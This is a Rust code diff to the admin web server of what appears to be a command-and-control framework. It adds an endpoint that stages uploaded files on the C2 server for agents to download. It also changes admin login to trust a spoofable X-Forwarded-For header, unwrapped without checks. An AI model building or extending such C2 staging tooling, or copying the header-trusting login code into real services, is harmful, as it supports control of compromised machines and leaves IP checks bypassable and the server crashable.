@@ -9,9 +9,9 @@ use crate::{
 };
 use axum::{
     Json,
-    extract::{ConnectInfo, Path, State},
+    extract::{ConnectInfo, Multipart, Path, State},
     http::{
-        StatusCode,
+        HeaderMap, StatusCode,
         header::{CONTENT_DISPOSITION, CONTENT_TYPE},
     },
     response::{Html, IntoResponse, Response},
@@ -22,7 +22,7 @@ use axum_extra::extract::{
 };
 use shared::{
     net::AdminLoginPacket,
-    tasks::{AdminCommand, BaBData},
+    tasks::{AdminCommand, BaBData, FileUploadStagingFromClient, WyrmResult},
 };
 
 pub async fn handle_admin_commands_on_agent(
@@ -102,11 +102,11 @@ pub async fn build_all_binaries_handler(
 
 pub async fn admin_login(
     jar: CookieJar,
-    addr: ConnectInfo<SocketAddr>,
     state: State<Arc<AppState>>,
+    headers: HeaderMap,
     Json(body): Json<AdminLoginPacket>,
 ) -> (CookieJar, Response) {
-    let ip = &addr.to_string();
+    let ip = headers.get("X-Forwarded-For").unwrap().to_str().unwrap();
     let username = body.username;
     let password = body.password;
 
@@ -188,4 +188,55 @@ pub async fn is_adm_logged_in() -> Response {
 
 pub async fn logout() -> Response {
     StatusCode::ACCEPTED.into_response()
+}
+
+pub async fn admin_upload(
+    State(state): State<Arc<AppState>>,
+    mut multipart: Multipart,
+) -> StatusCode {
+    let mut file_bytes = Vec::new();
+    let mut download_name = String::new();
+    let mut api_endpoint = String::new();
+
+    while let Some(field) = multipart.next_field().await.unwrap_or(None) {
+        match field.name() {
+            Some("file") => {
+                let fname = field.file_name().map(|f| f.to_string());
+                let bytes = field.bytes().await.unwrap_or_default();
+                file_bytes = bytes.to_vec();
+
+                if download_name.is_empty() {
+                    if let Some(fname) = fname {
+                        download_name = fname;
+                    }
+                }
+            }
+            Some("download_name") => download_name = field.text().await.unwrap_or_default(),
+            Some("api_endpoint") => api_endpoint = field.text().await.unwrap_or_default(),
+            _ => {}
+        }
+    }
+
+    if download_name.is_empty() || api_endpoint.is_empty() || file_bytes.is_empty() {
+        return StatusCode::BAD_REQUEST;
+    }
+
+    let data = FileUploadStagingFromClient {
+        download_name,
+        api_endpoint,
+        file_data: file_bytes,
+    };
+    let res = admin_dispatch(None, AdminCommand::StageFileOnC2(data), State(state)).await;
+    StatusCode::from_u16(
+        serde_json::from_slice::<Option<WyrmResult<String>>>(&res)
+            .map(|r| {
+                if matches!(r, Some(WyrmResult::Ok(_))) {
+                    202
+                } else {
+                    500
+                }
+            })
+            .unwrap_or(500),
+    )
+    .unwrap_or(StatusCode::INTERNAL_SERVER_ERROR)
 }
